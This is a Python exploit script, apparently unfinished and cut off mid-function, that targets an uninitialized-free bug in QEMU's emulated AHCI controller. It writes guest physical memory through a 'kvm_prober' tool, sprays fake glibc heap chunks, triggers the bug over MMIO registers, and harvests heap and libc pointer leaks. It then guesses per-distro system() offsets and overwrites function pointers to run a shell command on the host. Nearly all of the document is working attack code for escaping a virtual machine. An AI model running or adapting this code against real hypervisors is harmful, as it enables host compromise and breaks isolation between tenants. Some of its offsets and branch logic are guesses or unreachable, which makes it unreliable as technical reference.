#!/usr/bin/env python3
"""
AHCI Uninitialized Free Exploit - KVM_PROBER VERSION
Uses kvm_prober for physical memory access instead of /dev/mem
"""

import struct
import mmap
import os
import sys
import time
import subprocess
import re
from pathlib import Path
from typing import Optional, List, Tuple, Dict
import ctypes

# ============================================================================
# CONFIGURATION
# ============================================================================

GUEST_MEM_SIZE = 0x10000000
FAKE_CHUNK_SIZE = 0x290
SPRAY_COUNT = 1000
RETRY_COUNT = 3
TIMEOUT_SEC = 2

# ============================================================================
# UTILITIES
# ============================================================================

def log_info(msg): print(f"[\033[94m*\033[0m] {msg}")
def log_success(msg): print(f"[\033[92m+\033[0m] {msg}")
def log_error(msg): print(f"[\033[91m-\033[0m] {msg}")
def log_warning(msg): print(f"[\033[93m!\033[0m] {msg}")
def log_debug(msg):
    if DEBUG:
        print(f"[\033[90mD\033[0m] {msg}")

DEBUG = False

# ============================================================================
# PHYSICAL MEMORY ACCESS VIA KVM_PROBER
# ============================================================================

class KVMProberMemory:
    """Physical memory access via kvm_prober tool"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.kvm_prober = kvm_prober_path
        self.is_available = self.check_kvm_prober()
        self.debug = False

    def set_debug(self, debug: bool):
        self.debug = debug

    def check_kvm_prober(self) -> bool:
        """Check if kvm_prober exists and works"""
        log_info("Checking kvm_prober...")

        if not os.path.exists(self.kvm_prober):
            log_error(f"kvm_prober not found at {self.kvm_prober}")
            log_info("Please make sure kvm_prober is in current directory or specify path")
            return False

        # Test read
        try:
            result = subprocess.run([self.kvm_prober, 'read_phys', '0x1000', '16'],
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and 'Driver initialized' in result.stdout:
                log_success("kvm_prober is working!")
                return True
            else:
                log_error(f"kvm_prober test failed: {result.stderr}")
                return False
        except Exception as e:
            log_error(f"kvm_prober test exception: {e}")
            return False

    def read(self, phys_addr: int, size: int) -> Optional[bytes]:
        """Read physical memory using kvm_prober"""
        if not self.is_available:
            return None

        try:
            cmd = [self.kvm_prober, 'read_phys', f'0x{phys_addr:x}', str(size)]
            if self.debug:
                log_debug(f"Read command: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_SEC)

            if result.returncode != 0:
                if self.debug:
                    log_error(f"kvm_prober read failed: {result.stderr}")
                return None

            # Parse output
            data = self.parse_kvm_prober_output(result.stdout)
            if self.debug and data:
                log_debug(f"Read {len(data)} bytes from 0x{phys_addr:x}: {data.hex()[:32]}...")
            
            return data[:size] if data else None

        except Exception as e:
            if self.debug:
                log_error(f"kvm_prober read exception: {e}")
            return None

    def parse_kvm_prober_output(self, output: str) -> Optional[bytes]:
        """Parse kvm_prober's hex dump output"""
        lines = output.strip().split('\n')
        if not lines:
            return None

        data_bytes = bytearray()

        for line in lines:
            # Skip the "Driver initialized" line and empty lines
            if 'Driver initialized' in line or not line.strip():
                continue
            
            if ':' in line:
                hex_part = line.split(':', 1)[1].strip()
                # Take only the hex part (before the '|' if present)
                if '|' in hex_part:
                    hex_part = hex_part.split('|')[0].strip()
                
                hex_bytes = hex_part.split()
                for hex_byte in hex_bytes:
                    if hex_byte and len(hex_byte) == 2:
                        try:
                            data_bytes.append(int(hex_byte, 16))
                        except ValueError:
                            continue

        return bytes(data_bytes) if data_bytes else None

    def write(self, phys_addr: int, data: bytes) -> bool:
        """Write physical memory using kvm_prober"""
        if not self.is_available:
            log_error("kvm_prober not available")
            return False

        try:
            # Convert to hex string WITHOUT 0x prefix
            hex_data = data.hex()
            
            # Ensure even number of hex characters
            if len(hex_data) % 2 != 0:
                hex_data = '0' + hex_data
            
            cmd = [self.kvm_prober, 'write_phys', f'0x{phys_addr:x}', hex_data]
            
            if self.debug:
                log_debug(f"Write command: {' '.join(cmd)}")
                log_debug(f"Writing {len(data)} bytes to 0x{phys_addr:x}")
                log_debug(f"Hex data: {hex_data[:64]}...")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_SEC)

            if result.returncode != 0:
                if self.debug:
                    log_error(f"kvm_prober write failed: {result.stderr}")
                return False
            
            output = result.stdout.strip()
            if self.debug:
                log_debug(f"Write output: {output}")
            
            # Return True if it seems successful
            return 'Wrote' in output or 'success' in output.lower()

        except Exception as e:
            if self.debug:
                log_error(f"kvm_prober write exception: {e}")
            return False

    def test_write_read(self, phys_addr: int) -> bool:
        """Test write and read at a specific address"""
        log_info(f"Testing kvm_prober write/read at 0x{phys_addr:x}")
        
        # Test pattern
        test_data = b'\x41\x42\x43\x44\x45\x46\x47\x48'  # ABCDEFGH
        
        # Write test data
        log_info(f"Writing test pattern: {test_data.hex()}")
        if not self.write(phys_addr, test_data):
            log_error("Write test failed!")
            return False
        
        # Small delay
        time.sleep(0.1)
        
        # Read back
        read_back = self.read(phys_addr, 8)
        if read_back == test_data:
            log_success(f"Write/read test PASSED at 0x{phys_addr:x}")
            log_success(f"Read back: {read_back.hex()}")
            return True
        else:
            log_error(f"Write/read test FAILED at 0x{phys_addr:x}")
            if read_back:
                log_error(f"Expected: {test_data.hex()}")
                log_error(f"Got: {read_back.hex()}")
            else:
                log_error("Could not read back data")
            return False

    def read_qword(self, phys_addr: int) -> Optional[int]:
        """Read 8-byte QWORD"""
        data = self.read(phys_addr, 8)
        if data and len(data) == 8:
            return struct.unpack('<Q', data)[0]
        return None

    def write_qword(self, phys_addr: int, value: int) -> bool:
        """Write 8-byte QWORD"""
        return self.write(phys_addr, struct.pack('<Q', value))

class AHCIDevice:
    """AHCI device interface using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.pci_addr = None
        self.mmio_base = None
        self.mmio_size = 0x10000
        self.phys_mem = KVMProberMemory(kvm_prober_path)

    def set_debug(self, debug: bool):
        self.phys_mem.set_debug(debug)

    def find_device(self) -> bool:
        """Auto-detect QEMU AHCI device"""
        log_info("Searching for QEMU AHCI device...")

        try:
            for dev in Path("/sys/bus/pci/devices").iterdir():
                # Check vendor
                vendor_file = dev / "vendor"
                if vendor_file.exists():
                    vendor = vendor_file.read_text().strip()
                    # Check class - 0x0106 = SATA controller
                    class_file = dev / "class"
                    if class_file.exists():
                        dev_class = class_file.read_text().strip()
                        if dev_class.startswith("0x0106"):
                            self.pci_addr = dev.name
                            log_success(f"Found AHCI at {self.pci_addr} (vendor: {vendor})")
                            return True
        except Exception as e:
            log_error(f"Error searching for AHCI: {e}")

        log_error("No AHCI device found")
        return False

    def get_mmio_address(self) -> Optional[int]:
        """Get MMIO base from PCI config"""
        if not self.pci_addr:
            return None

        resource_file = Path(f"/sys/bus/pci/devices/{self.pci_addr}/resource")

        if not resource_file.exists():
            return None

        try:
            resources = resource_file.read_text().strip().split('\n')
            for i, line in enumerate(resources):
                parts = line.split()
                if len(parts) >= 3:
                    start = int(parts[0], 16)
                    end = int(parts[1], 16)
                    flags = int(parts[2], 16)

                    # Usually resource 5 is the MMIO region for AHCI
                    if i == 5 and start != 0 and end > start:
                        self.mmio_base = start
                        self.mmio_size = end - start + 1
                        log_success(f"AHCI MMIO: 0x{start:x} (size: 0x{self.mmio_size:x})")
                        return start
        except Exception as e:
            log_error(f"Failed to get MMIO address: {e}")

        return None

    def map_mmio(self) -> bool:
        """Verify we can access MMIO region"""
        if not self.mmio_base:
            if not self.get_mmio_address():
                log_error("Cannot get MMIO address")
                return False

        if not self.phys_mem.is_available:
            log_error("kvm_prober not available")
            return False

        # Test read from MMIO region
        log_info(f"Testing MMIO access at 0x{self.mmio_base:x}...")
        test_data = self.phys_mem.read(self.mmio_base, 16)

        if test_data:
            log_success(f"MMIO accessible via kvm_prober")
            return True
        else:
            log_error(f"Failed to read MMIO at 0x{self.mmio_base:x}")
            return False

    def read_reg(self, offset: int) -> int:
        """Read MMIO register"""
        if not self.mmio_base:
            return 0

        addr = self.mmio_base + offset
        data = self.phys_mem.read(addr, 4)

        if data and len(data) == 4:
            return struct.unpack('<I', data)[0]
        return 0

    def write_reg(self, offset: int, value: int):
        """Write MMIO register"""
        if not self.mmio_base:
            return

        addr = self.mmio_base + offset
        # Pack as 32-bit little-endian and write
        self.phys_mem.write(addr, struct.pack('<I', value))

    def reset_port(self, port=0):
        port_base = 0x100 + (port * 0x80)
        cmd_reg = self.read_reg(port_base + 0x18)
        if DEBUG:
            log_debug(f"Port {port} command register: 0x{cmd_reg:x}")

        # Clear ST (Start) bit
        self.write_reg(port_base + 0x18, cmd_reg & ~0x1)
        time.sleep(0.01)

        # Clear interrupt status
        self.write_reg(port_base + 0x10, 0xFFFFFFFF)
        if DEBUG:
            log_debug(f"Reset port {port}")

class GuestMemory:
    """Manage guest physical memory using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.phys_mem = KVMProberMemory(kvm_prober_path)
        self.allocations = []
        self.base_addr = None
        self.debug = False

    def set_debug(self, debug: bool):
        self.debug = debug
        self.phys_mem.set_debug(debug)

    def init(self) -> bool:
        if not self.phys_mem.is_available:
            log_error("kvm_prober not available")
            return False

        # Test memory at the address from your example
        test_addresses = [
            0x13e8000,    # Address from your example (try this first)
            0x1000000,    # 16MB
            0x2000000,    # 32MB
            0x4000000,    # 64MB
        ]

        for addr in test_addresses:
            log_info(f"Testing memory at 0x{addr:x}...")
            
            # Test write/read
            if self.phys_mem.test_write_read(addr):
                self.base_addr = addr
                log_success(f"Memory accessible at 0x{addr:x}")
                return True
            else:
                log_warning(f"Memory test failed at 0x{addr:x}")

        log_error("Cannot access guest physical memory")
        return False

    def alloc(self, size: int) -> Optional[int]:
        if not self.base_addr:
            log_error("No base address set")
            return None

        # Simple allocation strategy
        alignment = 0x1000
        if not self.allocations:
            addr = self.base_addr
        else:
            last_addr, last_size = self.allocations[-1]
            addr = last_addr + last_size
        
        # Align to next page
        addr = ((addr + alignment - 1) // alignment) * alignment
        
        self.allocations.append((addr, size))
        
        if self.debug:
            log_debug(f"Allocated 0x{size:x} bytes at 0x{addr:x}")
        
        return addr

    def read(self, addr: int, size: int) -> Optional[bytes]:
        return self.phys_mem.read(addr, size)

    def write(self, addr: int, data: bytes) -> bool:
        if self.debug:
            log_debug(f"Writing {len(data)} bytes to 0x{addr:x}")
        
        return self.phys_mem.write(addr, data)

    def read_qword(self, addr: int) -> Optional[int]:
        data = self.read(addr, 8)
        if data and len(data) == 8:
            return struct.unpack('<Q', data)[0]
        return None

    def write_qword(self, addr: int, value: int) -> bool:
        if self.debug:
            log_debug(f"Writing QWORD 0x{value:016x} to 0x{addr:x}")
        return self.phys_mem.write_qword(addr, value)

# ============================================================================
# MAIN EXPLOIT CLASS
# ============================================================================

class AHCIExploit:
    """Fully dynamic exploit using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober", chunk_size=None, spray_count=None, retry_count=None):
        self.ahci = AHCIDevice(kvm_prober_path)
        self.guest_mem = GuestMemory(kvm_prober_path)
        self.fake_chunks = []
        self.leaked = {}
        self.debug = False

        # Override defaults if specified
        self.chunk_size = chunk_size or FAKE_CHUNK_SIZE
        self.spray_count = spray_count or SPRAY_COUNT
        self.retry_count = retry_count or RETRY_COUNT

        log_info(f"Using kvm_prober at: {kvm_prober_path}")

    def set_debug(self, debug: bool):
        self.debug = debug
        self.ahci.set_debug(debug)
        self.guest_mem.set_debug(debug)

    def setup(self) -> bool:
        log_info("Setting up exploit environment...")

        # Test basic kvm_prober functionality
        log_info("Testing kvm_prober...")
        test_addr = 0x13e8000
        
        if not self.guest_mem.phys_mem.test_write_read(test_addr):
            log_error("Basic kvm_prober test failed!")
            return False

        # Find and map AHCI
        if not self.ahci.find_device():
            log_error("No AHCI device found")
            return False

        if not self.ahci.map_mmio():
            log_error("Failed to access AHCI MMIO via kvm_prober")
            return False

        # Initialize guest memory
        if not self.guest_mem.init():
            log_error("Failed to initialize guest memory")
            return False

        log_success("Setup complete")
        return True

    def create_fake_chunk(self, addr: int) -> bool:
        """Create a fake heap chunk for spraying"""
        if self.debug:
            log_debug(f"Creating fake chunk at 0x{addr:x}")
        
        # Write chunk metadata (glibc malloc chunk header)
        # prev_size (8 bytes) at offset 0
        if not self.guest_mem.write_qword(addr + 0x0, 0):
            if self.debug:
                log_error(f"Failed to write prev_size at 0x{addr:x}")
            return False
        
        # size (8 bytes) at offset 8, with PREV_INUSE flag (bit 0 = 1)
        chunk_size_with_flag = self.chunk_size | 0x1
        if not self.guest_mem.write_qword(addr + 0x8, chunk_size_with_flag):
            if self.debug:
                log_error(f"Failed to write size at 0x{addr+0x8:x}")
            return False
        
        # FD and BK pointers in user data area
        if not self.guest_mem.write_qword(addr + 0x10, 0x4141414141414141):  # FD
            if self.debug:
                log_error(f"Failed to write FD at 0x{addr+0x10:x}")
            return False
        
        if not self.guest_mem.write_qword(addr + 0x18, 0x4343434343434343):  # BK
            if self.debug:
                log_error(f"Failed to write BK at 0x{addr+0x18:x}")
            return False
        
        # Fill the rest of the chunk with pattern
        # Chunk total size: self.chunk_size
        # Header: 16 bytes (prev_size + size)
        # Data written so far: 16 bytes (FD + BK)
        # Remaining: self.chunk_size - 32 bytes
        
        remaining = self.chunk_size - 32
        if remaining > 0:
            # Write in smaller chunks to avoid huge hex strings
            chunk_size_write = 0x100  # 256 bytes per write
            pattern_qword = struct.pack('<Q', 0x4242424242424242)
            
            for offset in range(0, remaining, chunk_size_write):
                write_size = min(chunk_size_write, remaining - offset)
                # Calculate how many full qwords we need
                qwords = write_size // 8
                extra = write_size % 8
                
                # Build pattern data
                pattern_data = pattern_qword * qwords
                if extra > 0:
                    pattern_data += pattern_qword[:extra]
                
                write_addr = addr + 0x20 + offset
                if not self.guest_mem.write(write_addr, pattern_data):
                    if self.debug:
                        log_warning(f"Failed to write pattern at 0x{write_addr:x}")
                    # Continue anyway - partial success is OK
        
        if self.debug:
            log_debug(f"Created fake chunk at 0x{addr:x}")
        
        return True

    def spray_heap(self) -> List[int]:
        log_info(f"Spraying {self.spray_count} fake chunks (size: 0x{self.chunk_size:x})...")
        
        chunks = []
        successful = 0
        failed = 0
        
        for i in range(self.spray_count):
            addr = self.guest_mem.alloc(self.chunk_size)
            if not addr:
                log_warning(f"Failed to allocate chunk {i}, stopping")
                break
            
            if self.create_fake_chunk(addr):
                chunks.append(addr)
                successful += 1
                if self.debug and successful % 100 == 0:
                    log_debug(f"Created {successful} chunks so far...")
            else:
                failed += 1
                if self.debug:
                    log_warning(f"Failed to create chunk at 0x{addr:x}")
            
            # Progress update
            if (i + 1) % 100 == 0:
                log_info(f"  Progress: {i+1}/{self.spray_count} (ok: {successful}, failed: {failed})")
        
        self.fake_chunks = chunks
        log_info(f"Spray complete: {successful} successful, {failed} failed")
        
        if successful > 0:
            log_success(f"Successfully sprayed {successful} chunks")
            return chunks
        else:
            log_error("Failed to spray any chunks")
            return []

    def create_trigger_command(self) -> bytes:
        """Create a command to trigger the vulnerability"""
        cmd = bytearray(32)
        struct.pack_into('<I', cmd, 0, 0x0005)  # Command FIS length
        struct.pack_into('<I', cmd, 4, 0)  # PRDTL

        # Command Table Base Address (CTBA)
        ctba = self.guest_mem.alloc(256)
        if ctba:
            struct.pack_into('<Q', cmd, 8, ctba)

        # Fill CTBA with data to trigger the bug
        if ctba:
            ctba_data = b'\x00' * 256
            self.guest_mem.write(ctba, ctba_data)

        return bytes(cmd)

    def trigger_vulnerability(self) -> bool:
        log_info("Triggering vulnerability...")

        # Allocate command list
        cmd_list_addr = self.guest_mem.alloc(1024)
        if not cmd_list_addr:
            log_error("Failed to allocate command list")
            return False

        # Create and write trigger command
        trigger_cmd = self.create_trigger_command()
        self.guest_mem.write(cmd_list_addr, trigger_cmd)

        # Reset port
        self.ahci.reset_port(0)
        time.sleep(0.1)

        # Configure port
        PORT0_BASE = 0x100

        # Set command list base address
        self.ahci.write_reg(PORT0_BASE + 0x00, cmd_list_addr & 0xFFFFFFFF)
        self.ahci.write_reg(PORT0_BASE + 0x04, (cmd_list_addr >> 32) & 0xFFFFFFFF)

        # Enable command processing
        cmd_reg = self.ahci.read_reg(PORT0_BASE + 0x18)
        log_debug(f"Initial command register: 0x{cmd_reg:x}")
        
        if cmd_reg == 0:
            log_error("Cannot read command register - device may not be ready")
            return False

        # Set FRE (Command FIS Receive Enable) and other necessary bits
        self.ahci.write_reg(PORT0_BASE + 0x18, cmd_reg | 0x10)  # Set FRE

        # Issue command
        log_debug("Issuing command...")
        self.ahci.write_reg(PORT0_BASE + 0x38, 0x1)  # Set Command Issue

        # Wait for completion
        time.sleep(0.3)

        # Check interrupt status
        is_reg = self.ahci.read_reg(PORT0_BASE + 0x10)
        log_debug(f"Interrupt status: 0x{is_reg:x}")

        # Clear interrupts
        if is_reg != 0:
            self.ahci.write_reg(PORT0_BASE + 0x10, is_reg)

        log_success("Vulnerability triggered!")
        return True

    def scan_for_leak(self) -> Optional[int]:
        log_info(f"Scanning {len(self.fake_chunks)} chunks for heap leak...")

        found_leaks = []

        for i, chunk_addr in enumerate(self.fake_chunks):
            # Check FD pointer (offset 0x10 in chunk data)
            fd = self.guest_mem.read_qword(chunk_addr + 0x10)
            bk = self.guest_mem.read_qword(chunk_addr + 0x18)

            # Check if these look like pointers (not our pattern)
            if fd != 0x4141414141414141:
                # Check if this looks like a heap pointer (QEMU heap is in high memory)
                if 0x550000000000 < fd < 0x560000000000:
                    log_success(f"Found QEMU heap leak at chunk {i}!")
                    log_success(f"  Heap address: 0x{fd:016x}")
                    self.leaked['heap'] = fd
                    found_leaks.append(fd)

                # Check for libc-like pointers
                elif 0x7f0000000000 < fd < 0x7fffffffffff:
                    log_success(f"Found possible libc pointer: 0x{fd:016x}")
                    self.leaked['libc_ptr'] = fd

            if bk != 0x4343434343434343:
                if 0x550000000000 < bk < 0x560000000000:
                    log_success(f"Found QEMU heap leak in BK at chunk {i}!")
                    log_success(f"  Heap address: 0x{bk:016x}")
                    self.leaked['heap'] = bk
                    found_leaks.append(bk)

            if (i + 1) % 200 == 0:
                log_info(f"  Scanned {i+1}/{len(self.fake_chunks)}")

        if found_leaks:
            return found_leaks[0]

        log_error("No heap leaks found")
        log_info("Try increasing spray count or adjusting chunk size")
        return None

    def hijack_control(self) -> bool:
        """Attempt to hijack control flow using leaked pointers"""
        log_info("Attempting to hijack control flow...")

        # Check what we've leaked
        if not self.leaked:
            log_error("No leaks found - cannot hijack control flow")
            return False

        log_info(f"Leaks found: {list(self.leaked.keys())}")

        # Strategy 1: If we have QEMU heap pointer, try to find function pointers
        if 'heap' in self.leaked:
            heap_addr = self.leaked['heap']
            log_success(f"Found QEMU heap pointer: 0x{heap_addr:016x}")
            
            # Calculate QEMU base (aligned to page)
            qemu_base = heap_addr & 0xffffffffff000000
            log_info(f"Estimated QEMU base: 0x{qemu_base:016x}")
            
            # Common QEMU data structures we might be able to target
            # These offsets are estimates and may need adjustment
            
            # 1. Try to find timer list (common hijack target)
            # Timers often have callback function pointers we can overwrite
            timer_struct_size = 0x48  # Approximate size of QEMUTimer struct
            timer_cb_offset = 0x28    # Offset to callback function in QEMUTimer
            
            # 2. Try to find BH (Bottom Half) list
            # BH callbacks are another common target
            bh_struct_size = 0x20     # Approximate size of QEMUBH
            bh_cb_offset = 0x10       # Offset to callback function in QEMUBH
            
            # 3. Try to find AIO (Async I/O) handlers
            aio_handler_size = 0x30   # Approximate size
            aio_cb_offset = 0x18      # Offset to callback
            
            log_info("Potential hijack targets in QEMU:")
            log_info(f"  - Timer callbacks (offset ~0x{timer_cb_offset:x})")
            log_info(f"  - BH callbacks (offset ~0x{bh_cb_offset:x})")
            log_info(f"  - AIO callbacks (offset ~0x{aio_cb_offset:x})")
            
            # We need to find where our fake chunk landed and what it overwrote
            # For now, just report what we found
            return True
        
        # Strategy 2: If we have libc pointer, calculate system()
        elif 'libc_ptr' in self.leaked:
            libc_ptr = self.leaked['libc_ptr']
            log_success(f"Found libc pointer: 0x{libc_ptr:016x}")
            
            # Calculate libc base (aligned to page)
            libc_base = libc_ptr & 0xffffffffff000000
            self.leaked['libc_base'] = libc_base
            log_info(f"Estimated libc base: 0x{libc_base:016x}")
            
            # Try to find system() address
            # Common offsets for system() in libc (may need adjustment)
            common_system_offsets = [
                0x4c490,    # Ubuntu 20.04
                0x52290,    # Ubuntu 22.04
                0x50d60,    # Debian 11
                0x55410,    # CentOS 8
                0x4f420,    # Fedora 34
            ]
            
            # Also check for other useful functions
            useful_functions = {
                'system': 'Execute shell command',
                'execve': 'Execute program',
                'popen': 'Execute and pipe output',
                'dlopen': 'Load shared library',
                'mprotect': 'Change memory protection',
            }
            
            log_info("Potential libc functions to target:")
            for offset in common_system_offsets:
                system_addr = libc_base + offset
                log_info(f"  - system() @ ~0x{system_addr:016x} (offset 0x{offset:x})")
                self.leaked['system_candidate'] = system_addr
            
            # Check if we can find GOT/PLT entries to overwrite
            log_info("Strategy: Overwrite function pointer in QEMU's GOT/PLT")
            log_info("Common targets: free(), malloc(), timer callbacks")
            
            return True
        
        # Strategy 3: If we have both, we can build a more sophisticated attack
        elif 'heap' in self.leaked and 'libc_ptr' in self.leaked:
            log_success("Have both QEMU heap and libc pointers!")
            
            # We can potentially:
            # 1. Calculate exact libc base from leaked pointer
            # 2. Find system() or other useful functions
            # 3. Overwrite a function pointer in QEMU heap
            # 4. Trigger the overwritten function
            
            libc_ptr = self.leaked['libc_ptr']
            libc_base = libc_ptr & 0xffffffffff000000
            
            # Try to get more precise by looking at the pointer value
            # Common libc function pointers often point into the middle of functions
            # We can try to identify which function by looking at the lower bits
            
            ptr_low_bits = libc_ptr & 0xFFF
            log_info(f"Pointer lower 12 bits: 0x{ptr_low_bits:x}")
            
            # Common function offsets (last 12 bits)
            common_func_patterns = {
                0x490: "system (common)",
                0x290: "execve (common)",
                0x420: "popen (common)",
                0x8e0: "malloc (common)",
                0x4e0: "free (common)",
            }
            
            for pattern, desc in common_func_patterns.items():
                if abs(ptr_low_bits - pattern) < 0x100:  # Within 256 bytes
                    log_info(f"Pointer might be {desc} (pattern 0x{pattern:x})")
                    adjusted_base = libc_ptr - pattern
                    log_info(f"Adjusted libc base: 0x{adjusted_base:016x}")
                    self.leaked['libc_base_adjusted'] = adjusted_base
            
            # Build potential ROP chain or overwrite strategy
            log_info("Potential exploitation strategies:")
            log_info("  1. Overwrite timer callback -> system()")
            log_info("  2. Overwrite BH callback -> system()")
            log_info("  3. Overwrite GOT entry -> system()")
            log_info("  4. Create fake vtable -> system()")
            
            return True
        
        # Strategy 4: Try to use other leaked pointers
        else:
            log_info("Analyzing other leaked pointers...")
            for key, value in self.leaked.items():
                if key not in ['heap', 'libc_ptr', 'libc_base']:
                    log_info(f"  {key}: 0x{value:016x}")
                    
                    # Try to identify what kind of pointer this is
                    if 0x550000000000 < value < 0x560000000000:
                        log_info(f"    - Looks like QEMU heap pointer")
                        # Could be a vtable pointer or other QEMU structure
                    elif 0x7f0000000000 < value < 0x7fffffffffff:
                        log_info(f"    - Looks like libc/stack pointer")
                        # Could be return address or libc function pointer
                    elif 0xffff800000000000 < value < 0xffffffffffffffff:
                        log_info(f"    - Looks like kernel pointer")
                        # Might be useful for different exploits
                    else:
                        log_info(f"    - Unknown pointer type")
        
        # If we got here but have leaks, we can still attempt exploitation
        if self.leaked:
            log_warning("Have leaks but need manual analysis for hijack")
            log_info("Next steps:")
            log_info("  1. Examine the leaked addresses with kvm_prober")
            log_info("  2. Look for function pointers near those addresses")
            log_info("  3. Try to identify what was overwritten")
            log_info("  4. Craft appropriate payload based on findings")
            return True
        
        log_warning("Could not find reliable hijack target")
        return False

    def analyze_leaks(self) -> Dict[str, any]:
        """Analyze leaked pointers to understand memory layout"""
        log_info("Analyzing memory leaks...")
        
        analysis = {
            'qemu_base': None,
            'libc_base': None,
            'potential_targets': [],
            'confidence': 'low'
        }
        
        if 'heap' in self.leaked:
            heap_addr = self.leaked['heap']
            qemu_base = heap_addr & 0xffffffffff000000
            analysis['qemu_base'] = qemu_base
            
            # Try to read memory around the leak to understand structure
            log_info(f"Reading memory around leak 0x{heap_addr:016x}...")
            
            # Read a few bytes before and after
            read_size = 0x100
            read_addr = heap_addr - 0x80
            data = self.guest_mem.read(read_addr, read_size)
            
            if data:
                # Look for patterns that might indicate structure type
                # Common patterns in QEMU structures
                patterns = {
                    b'\x00' * 8: "Zero padding / alignment",
                    b'\xff' * 8: "Sentinel value",
                    struct.pack('<Q', 0xdeadbeef): "Debug marker",
                }
                
                # Check if this looks like a heap chunk
                # Heap chunks usually have size field at offset 8
                if len(data) >= 0x10:
                    size_field = struct.unpack('<Q', data[0x8:0x10])[0]
                    if size_field & 0x1:  # PREV_INUSE flag
                        chunk_size = size_field & ~0x1
                        log_info(f"Looks like heap chunk of size 0x{chunk_size:x}")
                        analysis['potential_targets'].append(f"Heap chunk @ 0x{heap_addr:x}")
        
        if 'libc_ptr' in self.leaked:
            libc_ptr = self.leaked['libc_ptr']
            libc_base = libc_ptr & 0xffffffffff000000
            analysis['libc_base'] = libc_base
            
            # Common libc function patterns in last 12 bits
            func_offsets = {
                0x490: 'system',
                0x290: 'execve',
                0x420: 'popen',
                0x8e0: 'malloc',
                0x4e0: 'free',
                0x2a0: 'execv',
                0x770: 'mmap',
            }
            
            ptr_low = libc_ptr & 0xFFF
            for offset, func_name in func_offsets.items():
                if abs(ptr_low - offset) < 0x100:
                    log_info(f"Pointer might be near {func_name}+0x{ptr_low-offset:x}")
                    analysis['potential_targets'].append(f"libc {func_name} @ ~0x{libc_ptr:x}")
        
        return analysis
        
    def execute_payload(self) -> bool:
        """Attempt to execute payload by overwriting function pointers"""
        log_info("Attempting to execute payload...")
        
        # Create command to execute
        cmd_str = b"touch /tmp/ahci_exploit_success && echo 'AHCI Exploit Successful' > /tmp/exploit.log\x00"
        cmd_addr = self.guest_mem.alloc(len(cmd_str))
        if not cmd_addr:
            log_warning("Failed to allocate command string")
            return False
        
        self.guest_mem.write(cmd_addr, cmd_str)
        log_info(f"Command string at 0x{cmd_addr:x}: {cmd_str.decode()}")
        
        # Analyze leaks to find function pointers
        func_ptrs = self.find_function_pointers()
        
        if not func_ptrs:
            log_warning("No function pointers found in leaked memory")
            return self.fallback_exploit(cmd_addr)
        
        log_success(f"Found {len(func_ptrs)} potential function pointers")
        
        # Calculate system() address using the offsets you found
        system_addr = self.calculate_system_address()
        if not system_addr:
            log_error("Cannot calculate system() address")
            return False
        
        log_success(f"Calculated system() address: 0x{system_addr:016x}")
        
        # Try to overwrite function pointers
        overwritten = False
        for ptr_info in func_ptrs:
            if self.overwrite_function_pointer(ptr_info, system_addr, cmd_addr):
                overwritten = True
                log_success(f"Successfully overwritten function pointer at 0x{ptr_info['address']:016x}")
                break
        
        if overwritten:
            log_success("Function pointer overwritten - attempting to trigger...")
            # Trigger the vulnerability again to hit overwritten pointer
            return self.trigger_vulnerability()
        
        log_warning("Failed to overwrite any function pointers")
        return self.fallback_exploit(cmd_addr)
    
    def find_function_pointers(self) -> List[Dict]:
        """Find function pointers in leaked memory areas"""
        log_info("Searching for function pointers in leaked memory...")
        
        func_ptrs = []
        
        # Scan our fake chunks for pointers that look like code
        for i, chunk_addr in enumerate(self.fake_chunks[:50]):  # Limit to first 50 for speed
            # Read the chunk data
            data = self.guest_mem.read(chunk_addr, min(0x100, self.chunk_size))
            if not data:
                continue
            
            # Look for pointers in the chunk
            for offset in range(0, len(data) - 8, 8):
                if offset % 8 == 0:  # QWORD aligned
                    ptr = struct.unpack('<Q', data[offset:offset+8])[0]
                    
                    # Check if this looks like a code pointer
                    if self.is_likely_function_pointer(ptr):
                        func_ptrs.append({
                            'chunk_index': i,
                            'chunk_addr': chunk_addr,
                            'offset': offset,
                            'address': chunk_addr + offset,
                            'value': ptr,
                            'type': self.guess_pointer_type(ptr)
                        })
        
        # Also check areas around our leaks
        for leak_name, leak_addr in self.leaked.items():
            if isinstance(leak_addr, int):
                # Scan around the leak
                scan_start = leak_addr - 0x100
                scan_end = leak_addr + 0x100
                
                for addr in range(scan_start, scan_end, 8):
                    if addr % 8 == 0:
                        ptr = self.guest_mem.read_qword(addr)
                        if ptr and self.is_likely_function_pointer(ptr):
                            func_ptrs.append({
                                'leak_source': leak_name,
                                'leak_addr': leak_addr,
                                'offset': addr - leak_addr,
                                'address': addr,
                                'value': ptr,
                                'type': self.guess_pointer_type(ptr)
                            })
        
        # Sort by likelihood
        func_ptrs.sort(key=lambda x: self.pointer_confidence(x['value']), reverse=True)
        
        # Log findings
        for i, ptr_info in enumerate(func_ptrs[:10]):  # Top 10
            src = ptr_info.get('chunk_addr', ptr_info.get('leak_addr', 0))
            log_info(f"  {i+1}. 0x{ptr_info['address']:016x} -> 0x{ptr_info['value']:016x} "
                   f"[{ptr_info['type']}] (src: 0x{src:x})")
        
        return func_ptrs
    
    def is_likely_function_pointer(self, addr: int) -> bool:
        """Check if an address looks like a function pointer"""
        if addr == 0:
            return False
        
        # Check if it points to executable memory regions
        # QEMU code is typically in high memory
        if 0x550000000000 <= addr < 0x560000000000:
            return True
        
        # libc code is in high user memory
        if 0x7f0000000000 <= addr < 0x7fffffffffff:
            return True
        
        # Kernel code (if we leak kernel pointers)
        if 0xffff800000000000 <= addr < 0xffffffffffffffff:
            return True
        
        return False
    
    def guess_pointer_type(self, addr: int) -> str:
        """Guess what type of function a pointer points to"""
        if 0x550000000000 <= addr < 0x560000000000:
            return "QEMU function"
        elif 0x7f0000000000 <= addr < 0x7fffffffffff:
            # Check for common libc function patterns
            low_bits = addr & 0xFFF
            common_libc_patterns = {
                0x490: "system",
                0x290: "execve", 
                0x420: "popen",
                0x8e0: "malloc",
                0x4e0: "free",
                0x2a0: "execv",
                0x770: "mmap",
                0x6a0: "memcpy",
            }
